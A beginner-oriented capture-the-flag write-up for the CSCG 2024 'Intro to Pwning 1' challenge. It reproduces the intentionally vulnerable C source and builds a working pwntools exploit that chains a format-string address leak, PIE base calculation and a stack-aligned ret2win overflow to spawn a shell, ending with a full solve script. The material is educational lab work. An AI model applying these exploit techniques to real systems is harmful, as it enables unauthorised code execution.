---
title: CSCG 2024 - Intro to Pwning 1
author: Abhishek Satpathy
pubDatetime: 2025-03-21T23:35:23Z
modDatetime: 2025-03-27T05:24:55Z
slug: cscg-intro-to-pwning-1
featured: false
draft: false
tags:
  - pwn
  - pwntools
  - CSCG

description: A writeup on "Intro to Pwning 1" for Cyber Security Challenge Germany 2024 (CSCG 2024).
---

## Table of contents

## Introduction

This challenge was an enjoyable introduction to the world of `pwn`. Although there are several excellent write-ups available, I wanted to provide a guide for complete beginners to understand how to approach this challenge.

Prerequisites

- A basic understanding of C
- Some understanding of return-oriented programming (ROP)
- Familiarity with `pwntools`.

## First Steps

The challenge description was as follows:

> This is an introductory challenge for exploiting Linux binaries with memory corruptions. Nowadays there are quite a few mitigations that make it not as straight forward as it used to be. So in order to introduce players to pwnable challenges, LiveOverflow created a video walkthrough of the first challenge.
>
> This challenge was already featured in last year's CSCG. We are aware that public writeups exist, but we figured this challenge is still a nice-to-have for newcomers, so we released it again.
>
> Note: The video writeup of LiveOverflow is not completely functional. To give you hint: It's about the address of the ret instruction that was chosen to re-align the stack. Suppose ASLR is rather 'smooth' - meaning a whole bunch of nibbles are zero - (which is pretty much always the case in our setup) all addresses within the offset range of 0xa00 to `0xaff` translate to addresses looking like `xxxxxxxxxx0axx`, requiring you to send the bytes `xx xx xx xx xx xx 0a xx` over the wire. Now the problem with this is that 0a is a newline `(\n)`, which in turn terminates `gets()` (refer to man 3 gets), meaning that your payload terminates prematurely.

Upon downloading and unzipping the 'intro-pwn-1.zip', you can find 5 files. Of these, only `pwn1` and `pwn1.c` are necessary for now. We don't need to mess with the `Dockerfile` yet (or at all) because we don't need to find any `libc` offsets.

```c
void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}

void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Hufflepuff! │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}

void AAAAAAAA() {
    char read_buf[0xff];

    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Hufflepuff!\n");
        _exit(0);
    }
}
// --------------------------------------------------- MAIN

void main(int argc, char* argv[]) {
	ignore_me_init_buffering();
	ignore_me_init_signal();

    welcome();
    AAAAAAAA();
}
```

The end-goal as an attacker is to somehow call the `WINgardium_leviosa()` to spawn a shell and obtain arbitrary RCE. Checking security by running `e = ELF('./pwn')` with `pwntools` reveals the following.

```
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The lack of a stack canary opens up the potential for stack smashing combined with the vulnerable `gets` function, but PIE enabled means that we need to find a memory leak in order to perform a "ret2win" attack.

Taking a look at the code three vulnerabilities immediately jump out at me.

1. Stack buffer overflow with `gets(read_buf);` in the `welcome()` function.
2. Format string vulnerability with `printf(read_buf)`.
3. Stack buffer overflow with `gets(read_buf);` in the `AAAAAAAA()` function.

Keeping these vulnerabilities in mind I came up with the following plan.

1. Leak an important memory address by passing a bunch of %p's to `printf`.
2. Use the leaked address to calculate the address of `WINgardium_leviosa`
3. Overwrite return address in the stack and ret2win.

## Writing the Actual Exploit.

I started by writing a simple Python script for local debugging:

```python
from pwn import *
import sys

e = context.binary = ELF("./pwn1")
main_offset = e.symbols['main']

if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    io = process("./pwn1")
else:
    io = remote("example-url.cscg.live", 1337, ssl=True)
# use the attached format string reading if you don't understand what's going on here
payload = b"%p|"*50
io.sendline(payload)
pause() # attach debugger of choice here
io.interactive()
```

After attaching `lldb` to the process, I set a breakpoint at main to find its location in memory:

```
Breakpoint 1: where = pwn1`main, address = 0x0000555643e00af4
```

Taking a look at the output I spotted the exact same address in the stack 5 spots from the 50th making it the 45th pointer:

```
0x1|0x1|0x7f1ec3fad887|0x4b|(nil)|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|
0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|
0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|
0x257c70257c70257c|0x7c70257c70257c70|0x7c70257c7025|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x7ffd00000000|
(nil)|0x5f91161c87dde300|(nil)|0x555643e009e9|0x7ffd7c64f7c0|0x555643e00b21|0x7ffd7c64f8d8|0x100000000|0x1|
0x7f1ec3ec2d90|(nil)|0x555643e00af4|0x100000000|0x7ffd7c64f8d8|(nil)|0xb267089d052cd1b4|0x7ffd7c64f8d8|
```

Running the script again confirmed that the 45th pointer would always be the address of `main`. Now we have a memory leak, so let's calculate some offsets.

```python
io.sendline("%45$p")
main_addr = int(io.recvuntil(" enter your magic spell:", drop=True)[-12:].decode(), 16)
print(f"Address of main : {hex(main_addr)}")
base_addr = main_addr - main_offset
print(f"Executable base address : {hex(base_addr)}")
win_addr = base_addr+e.symbols['WINgardium_leviosa']
print(f"WINGardium Leviosa : {hex(win_addr)}")
```

## Stack Smashing

Now that we know the address of `WINGardium_leviosa` all we need to do is overwrite the return address in memory of the main function and return to `WINGardium_leviosa` from `AAAAAAAA`. First though, we need to know the offset from the start of the input buffer and the return address.

```python
g = cyclic_gen()
cyclic_payload = g.get(0xff+1) #0xff is the buffer size
pause()
io.sendline(cyclic_payload)
io.interactive()
```

Running this script and examining memory with lldb, we discover that the offset between the start of buffer and the return address is 264 bytes.

![offsets](@/assets/images/ctf/c2cctf-ghidra.png))

Now that we have our offsets, our memory leak, and we've identified our stack smashing vulnerability we're ready to perform our `ret2win` attack.

One thing to keep in mind is that we need to prepend the word 'Expelliarmus' to our attack; otherwise, the program exits without ever returning, rendering our return attack ineffective. Luckily this program is using the `gets` function which will continue reading past null bytes instead of terminating. This allows to prepend arbitrary content to pass a `strcmp` while still passing a buffer overflow payload.

So, lets craft our payload:

```python
offset = 264
required_text = b"Expelliarmus\x00"
payload = required_text + (264-len(required_text))*b"A" + win_addr.to_bytes(8, 'little')

io.sendline(payload)
io.interactive()
```

Uh-oh! When we run the script locally, we get an error: `exit code -11 (SIGSEGV)`. Looking at the debugger the program throws an error on `MOVAPS`. Taking a look at the first result on Google ([ROP Emporium](https://ropemporium.com/guide.html#Common%20pitfalls), it turns out that in some cases "The 64 bit calling convention requires the stack to be 16-byte aligned." So in order to align the stack we can add one more `ret` instruction to our chain, but how? We know that any section of code in memory can be executed by jumping to it. If we prepend the address of a `ret` instruction to our overflow payload, it will jump to and run the instruction. When we run the instruction for the second time it'll just pop another 8 bytes off the stack into the %rip register. So, let's just add a `ret` instruction to the chain.

```python
rop = ROP('./pwn1')
ret_addr = base_addr + rop.ret[0]

offset = 264
required_text = b"Expelliarmus\x00"
payload = required_text + (264-len(required_text))*b"A" + ret_addr.to_bytes(8, 'little') + win_addr.to_bytes(8, 'little')
io.sendline(payload)
io.interactive()
```

After adding the instruction we get a shell, and now we just run `cat flag` for the flag.

Flag : `CSCG{NOW_PRACTICE_EVEN_MORE}`

## Appendix

Solve Script:

```python
from pwn import *
import sys

e = context.binary = ELF("./pwn1")
main_offset = e.symbols['main']

if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    io = process('./pwn1')

else:
    io = remote("49c5aa893e445ac502d05830-1024-intro-pwn-1.challenge.cscg.live", 1337, ssl=True)

format_payload = "%45$p"

"""
for i in range (50):
    payload += f"%p|"
"""
io.recvuntil("name:")
io.sendline(format_payload)
main_addr = int(io.recvuntil(" enter your magic spell:", drop=True)[-12:].decode(), 16)
print(f"Address of main : {hex(main_addr)}")
base_addr = main_addr - main_offset
print(f"Executable base address : {hex(base_addr)}")
win_addr = base_addr+e.symbols['WINgardium_leviosa']
print(f"WINGardium Leviosa : {hex(win_addr)}")

"""
g = cyclic_gen()
cyclic_payload = g.get(0xff+1) #0xff is the buffer size
pause() # attach debugger of choice here
io.sendline(cyclic_payload)
"""

rop = ROP('./pwn1')
ret_addr = base_addr + rop.ret[0]

offset = 264
required_text = b"Expelliarmus\x00"
payload = required_text + (264-len(required_text))*b"A" + ret_addr.to_bytes(8, 'little') + win_addr.to_bytes(8, 'little')

io.sendline(payload)
io.interactive()
```

Further Reading:

- [Format String Exploitation](https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/format-string.md)
- [MOVAPS Segfault](https://ropemporium.com/guide.html#Common%20pitfalls)
